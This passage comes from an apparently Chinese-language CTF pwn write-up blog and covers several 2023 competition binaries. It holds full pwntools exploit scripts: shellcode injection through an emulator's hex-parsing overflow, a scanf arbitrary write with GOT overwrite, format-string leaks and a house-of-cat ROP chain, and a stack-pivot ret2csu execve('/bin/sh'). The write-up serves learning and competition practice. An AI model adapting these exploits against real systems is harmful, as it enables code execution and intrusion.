alt="image-20230612103918902"></p><p>首先将a2，也就是指令缓冲区开头两字节设置为0xc748，接着检测后面的字符是否为r，即检测第一个操作值是否为r1-r4，是的话就将指令缓冲区后面添加相应的字节码，c0-c3.</p><p>然后开始检测第二个操作值是否是十六进制数(开头是否为0x)，是的话就将其转换成16进制，再将转换之后的数据存入缓冲区之中。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230612105932686.png" alt="image-20230612105932686"></p><p>这里memcpy默认的长度为4，然而当转换16进制数之后的长度大于4的情况下，就会将多余的十六进制数也拷贝到字节码缓冲区中。</p><p>然而，在解析指令的时候，立即数的长度为4字节，多出来的字节会被解析为其他指令</p><p>输入下图指令</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230612112922950.png" alt="image-20230612112922950"></p><p>输入<code>load r1, 0x1234567878563412</code>，解析的指令如下</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230612113012032.png" alt="image-20230612113012032"></p><p>很明显，from_hex除了将字符串转换成16进制数以外，还转换了字节序。我们需要利用溢出的字节来执行我们自己的shellcode。</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./fast_emulator&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x0000000000001a1d)&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Please enter the number of lines you want to enter: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;load r2 0x&#x27;</span>+<span class="string">b&#x27;d23148f63148583b6a&#x27;</span>+<span class="string">b&#x27;00000000&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;load r2 0x&#x27;</span>+<span class="string">b&#x27;68732f6e69622f2fbb48&#x27;</span>+<span class="string">b&#x27;00000000&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;load r2 0x&#x27;</span>+<span class="string">b&#x27;e789485308ebc148&#x27;</span>+<span class="string">b&#x27;00000000&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;load r2 0x&#x27;</span>+<span class="string">b&#x27;050f&#x27;</span>+<span class="string">b&#x27;00000000&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov rbx,0x68732f6e69622f2f</span></span><br><span class="line"><span class="string">shr rbx,8</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>注意，这里输入shellcode的字节码的时候，应该和正常的字节码的顺序相反，因为from_hex会做一次逆序。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230612162212897.png" alt="image-20230612162212897"></p><h2 id="0x15-CISCN2023-华南赛区-easynote-【scanf导致任意地址写】"><a href="#0x15-CISCN2023-华南赛区-easynote-【scanf导致任意地址写】" class="headerlink" title="0x15.CISCN2023 华南赛区 easynote 【scanf导致任意地址写】"></a>0x15.CISCN2023 华南赛区 easynote 【scanf导致任意地址写】</h2><p>很隐蔽的漏洞点</p><p>在使用scanf时，第二个参数应该传入变量的地址，形如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>,&amp;size);</span><br></pre></td></tr></table></figure><p>而在IDA的伪代码中不会显示<code>&amp;</code></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230708135313789.png" alt="image-20230708135313789"></p><p>在汇编中表示为<code>lea</code>这个指令取出地址</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230708135350285.png" alt="image-20230708135350285"></p><p>而在这题中</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230708135850757.png" alt="image-20230708135850757"></p><p>对于size则是使用mov指令，正常情况是往size的地址中写入8字节的值，但在这里就是以size的值为地址写入8字节，如果能控制size就能够造成任意地址写。</p><p>如下图</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230708140857646.png" alt="image-20230708140857646"></p><p>size的地址为<code>0x7fffffffda50</code>，但在scanf中却是以size的值<code>0x4040d0</code>作为写入的地址 。</p><p>因此如果我们能够修改size的值，就可以使用scanf实现任意地址写</p><p>在get_int函数中</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230714204242925.png" alt="image-20230714204242925"></p><p>读取0x20字节的数据，然后使用atoi函数将其转换成整型</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230714204358464.png" alt="image-20230714204358464"></p><p>v1恰好可以覆盖到size的值。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230714204605670.png" alt="image-20230714204605670"></p><p>程序没有开启RELRO，got表可写。</p><p>首先来泄露libc地址，由于got表可写，所以可以将atoi的got表覆盖为printf的plt表，并且由于atoi的参数可控，则printf的参数也可控，这样就能够导致格式化字符串漏洞。</p><p>通过格式化字符串漏洞可以泄露栈地址、libc地址等各种地址。</p><p>有了栈地址和libc地址之后我原本打算将ROP链写入到show或者其他功能的返回地址处，但是由于每次只能写8字节，且show功能和add功能的栈空间有重叠，无法完全写入ROP链，所以这里就需要想别的利用方式。</p><p>这题的bss段中有stdout的got表</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230720104204799.png" alt="image-20230720104204799"></p><p>所以可以劫持stdout到我们伪造的FILE结构体处，然后触发house of cat进行ROP。</p><p>这里选择使用house of cat</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./easynote&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./easynote&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice :\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;talk\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Say?\n&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice :\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice :\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Content :\n&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice :\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">addr,val</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice :\n&#x27;</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">    payload=payload.ljust(<span class="number">0x18</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=p64(addr)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    add(val,<span class="string">b&#x27;\x1a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setval(elf.got[<span class="string">b&#x27;atoi&#x27;</span>],elf.plt[<span class="string">b&#x27;printf&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Choice :\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%p%17$p&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x29d90</span></span><br><span class="line">open_addr=libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr=libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr=libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">setcontext=libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_r12=libc_base+<span class="number">0x000000000011f497</span></span><br><span class="line">file_addr=<span class="number">0x00000000004040A0</span> + <span class="number">0x300</span></span><br><span class="line">io_wfile_jumps=libc_base+<span class="number">0x2160c0</span></span><br><span class="line">rop_addr=file_addr-<span class="number">0x100</span></span><br><span class="line">ret=libc_base+<span class="number">0x0000000000029cd6</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;stack_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stack_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;libc_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&#x27;open_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(open_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;read_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_addr)))</span><br><span class="line">log.success(<span class="string">&#x27;write_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(write_addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Choice :\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>.ljust(<span class="number">0x18</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(elf.got[<span class="string">b&#x27;atoi&#x27;</span>])</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;talk\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x4010c0</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Say?\n&#x27;</span>)</span><br><span class="line">io.send(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">setval(file_addr,<span class="number">0</span>)</span><br><span class="line">setval(file_addr+<span class="number">8</span>,<span class="number">0</span>)</span><br><span class="line">setval(file_addr+<span class="number">0x10</span>,<span class="number">0</span>)</span><br><span class="line">setval(file_addr+<span class="number">0x18</span>,<span class="number">0</span>)</span><br><span class="line">setval(file_addr+<span class="number">0x20</span>,<span class="number">0</span>)</span><br><span class="line">setval(file_addr+<span class="number">0x28</span>,<span class="number">0</span>)</span><br><span class="line">setval(file_addr+<span class="number">0x30</span>,<span class="number">0</span>)</span><br><span class="line">setval(file_addr+<span class="number">0x38</span>,<span class="number">0</span>)</span><br><span class="line">setval(file_addr+<span class="number">0x40</span>,<span class="number">1</span>)</span><br><span class="line">setval(file_addr+<span class="number">0x48</span>,<span class="number">0</span>)</span><br><span class="line">setval(file_addr+<span class="number">0x50</span>,file_addr+<span class="number">0xb0</span>)</span><br><span class="line">setval(file_addr+<span class="number">0x58</span>,setcontext)</span><br><span class="line">setval(file_addr+<span class="number">0x60</span>,<span class="number">0</span>)<span class="comment">#chain</span></span><br><span class="line">setval(file_addr+<span class="number">0x68</span>,<span class="number">0</span>)</span><br><span class="line">setval(file_addr+<span class="number">0x70</span>,<span class="number">0</span>)</span><br><span class="line">setval(file_addr+<span class="number">0x78</span>,<span class="number">0</span>)</span><br><span class="line">setval(file_addr+<span class="number">0x80</span>,<span class="number">0</span>)</span><br><span class="line">setval(file_addr+<span class="number">0x88</span>,file_addr+<span class="number">0x200</span>)</span><br><span class="line">setval(file_addr+<span class="number">0x90</span>,<span class="number">0</span>)</span><br><span class="line">setval(file_addr+<span class="number">0x98</span>,<span class="number">0</span>)</span><br><span class="line">setval(file_addr+<span class="number">0xa0</span>,file_addr+<span class="number">0x30</span>)</span><br><span class="line">setval(file_addr+<span class="number">0xa8</span>,<span class="number">0</span>)</span><br><span class="line">setval(file_addr+<span class="number">0xb0</span>,<span class="number">0</span>)</span><br><span class="line">setval(file_addr+<span class="number">0xb8</span>,<span class="number">0</span>)</span><br><span class="line">setval(file_addr+<span class="number">0xc0</span>,<span class="number">0</span>)</span><br><span class="line">setval(file_addr+<span class="number">0xc8</span>,<span class="number">0</span>)</span><br><span class="line">setval(file_addr+<span class="number">0xd0</span>,<span class="number">0</span>)</span><br><span class="line">setval(file_addr+<span class="number">0xd8</span>,io_wfile_jumps+<span class="number">0x10</span>)</span><br><span class="line">setval(file_addr+<span class="number">0xd8</span>+<span class="number">0x38</span>,file_addr+<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">setval(file_addr+<span class="number">0xb0</span>+<span class="number">0xa0</span>,rop_addr)</span><br><span class="line">setval(file_addr+<span class="number">0xb0</span>+<span class="number">0xa8</span>,ret)</span><br><span class="line">setval(file_addr-<span class="number">0x200</span>,u64(<span class="string">b&#x27;flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">payload=[pop_rdi,file_addr-<span class="number">0x200</span>,pop_rsi,<span class="number">0</span>,open_addr,pop_rdi,<span class="number">3</span>,pop_rsi,file_addr+<span class="number">0x100</span>,pop_rdx_r12,<span class="number">100</span>,<span class="number">0</span>,read_addr,pop_rdi,<span class="number">1</span>,pop_rsi,file_addr+<span class="number">0x100</span>,pop_rdx_r12,<span class="number">100</span>,<span class="number">0</span>,write_addr]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> payload:</span><br><span class="line">    setval(rop_addr,x)</span><br><span class="line">    rop_addr+=<span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Choice :\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>.ljust(<span class="number">0x18</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4040a0</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b* (_IO_wfile_seekoff)&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Choice :\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;talk\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(file_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x16-巅峰极客2023-linkmap-【栈迁移，构造syscall】"><a href="#0x16-巅峰极客2023-linkmap-【栈迁移，构造syscall】" class="headerlink" title="0x16.巅峰极客2023 linkmap 【栈迁移，构造syscall】"></a>0x16.巅峰极客2023 linkmap 【栈迁移，构造syscall】</h2><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230721194230500.png" alt="image-20230721194230500"></p><p>FULL RELRO，那么就没有延迟绑定机制，也就用不到linkmap结构体。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230721195240750.png" alt="image-20230721195240750"></p><p>有一个很大的栈溢出，但是没有输出函数。</p><p>通常来说程序里会存在一个编译器生成的gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add dword ptr [rbp - 0x3d], ebx ; </span><br><span class="line">nop dword ptr [rax + rax] ; </span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>只要能控制rbp和ebx的值就能够在栈上得到任意值。</p><p>但这题规避了这个gadget</p><p>不过这题自己有一些类似于后门函数的操作</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230721195811070.png" alt="image-20230721195811070"></p><p>这里将第一个参数的值指向的内存的数据赋给<code>0x601040</code>，我们需要获得libc地址，就可以通过这个操作，将read@got的地址作为第一个参数传入，就可以将read函数的真实地址写入0x601040.</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230721200219951.png" alt="image-20230721200219951"></p><p>注意到read函数的开头处存在syscall，所以可以通过溢出构造出read函数将0x601040的末尾1字节修改为0x90，这样就能够得到syscall</p><p>整体思路就是通过不断地栈迁移写入数据，得到syscall，利用ret2csu构造出execve(“&#x2F;bin&#x2F;sh”,0,0)</p><p>execve系统调用号为59，可以通过read的返回值来构造，读取59个字符就能够将rax设置为59</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./ezzzz&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ezzzz&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x0000000000400606</span></span><br><span class="line">csu_pop=<span class="number">0x00000000004007DA</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.text:00000000004007DA 5B                            pop     rbx</span></span><br><span class="line"><span class="string">.text:00000000004007DB 5D                            pop     rbp</span></span><br><span class="line"><span class="string">.text:00000000004007DC 41 5C                         pop     r12</span></span><br><span class="line"><span class="string">.text:00000000004007DE 41 5D                         pop     r13</span></span><br><span class="line"><span class="string">.text:00000000004007E0 41 5E                         pop     r14</span></span><br><span class="line"><span class="string">.text:00000000004007E2 41 5F                         pop     r15</span></span><br><span class="line"><span class="string">.text:00000000004007E4 C3                            retn</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x00000000004007e3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x00000000004007e1</span></span><br><span class="line">leave_ret=<span class="number">0x0000000000400712</span></span><br><span class="line">read_addr=<span class="number">0x0000000000400752</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret_csu</span>(<span class="params">func,arg1,arg2,arg3</span>):</span><br><span class="line">    payload=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(func)</span><br><span class="line">    payload+=p64(arg1)+p64(arg2)+p64(arg3)</span><br><span class="line">    payload+=p64(<span class="number">0x00000000004007C0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x10</span>+p64(elf.bss(<span class="number">0x300</span>)+<span class="number">0x10</span>)+p64(read_addr)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload1)</span><br><span class="line">payload2=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x10</span>+p64(elf.bss(<span class="number">0x400</span>))+p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(backdoor)+p64(read_addr)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.send(payload2)</span><br><span class="line">payload3=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+<span class="string">&#x27;A&#x27;</span>*<span class="number">0x8</span>+p64(elf.bss(<span class="number">0x500</span>))+p64(read_addr)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload3)</span><br><span class="line">payload4=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x10</span>+p64(elf.bss(<span class="number">0x600</span>))+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(<span class="number">0x601040</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x00000000004004E0</span>)+p64(read_addr)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.send(payload4)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.send(p8(<span class="number">0x90</span>))</span><br><span class="line">payload5=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x10</span>+p64(elf.bss(<span class="number">0x700</span>))+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(elf.bss(<span class="number">0x100</span>))+p64(<span class="number">0</span>)+p64(<span class="number">0x00000000004004E0</span>)+p64(csu_pop)+ret_csu(<span class="number">0x601040</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x601400</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.send(payload5)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">59</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x17-CISCN2023华南赛区-Virtual-World"><a href="#0x17-CISCN2023华南赛区-Virtual-World" class="headerlink" title="0x17.CISCN2023华南赛区 Virtual_World"></a>0x17.CISCN2023华南赛区 Virtual_World</h2><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230723153622569.png" alt="image-20230723153622569"></p><p>打开是一个菜单堆</p><p>在初始化函数中</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230723153926813.png" alt="image-20230723153926813"></p><p>mmap出来了一块内存，并设置了一个结构体</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230723154013829.png" alt="image-20230723154013829"></p><p>如上图，edit函数中，存在越界读漏洞。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230723154159228.png" alt="image-20230723154159228"></p><p>dele函数中存在uaf</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230723154230237.png" alt="image-20230723154230237"></p><p>根据堆中的执行vm_handler</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20230723154847318.png" alt="image-20230723154847318"></p><p>opcode为4字节一组，不能超过6，功能1为push，将一个值压入栈中；功能2为</p><h2 id="0x18-羊城杯2023shellcode-【shellcode】"><a href="#0x18-羊城杯2023shellcode-【shellcode】" class="headerlink" title="0x18.羊城杯2023shellcode 【shellcode】"></a>0x18.羊城杯2023shellcode 【shellcode】</h2><p>主函数如下</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231019193732641.png" alt="image-20231019193732641"></p><p>输入ye以外的数据进入到else分支</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231019193809273.png" alt="image-20231019193809273"></p><p>只允许输入0x10字节的code，但由于if判断在输入的后面，所以实际上可以输入0x11字节的数据。数据的范围被限制在0x4f-0x5f之间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 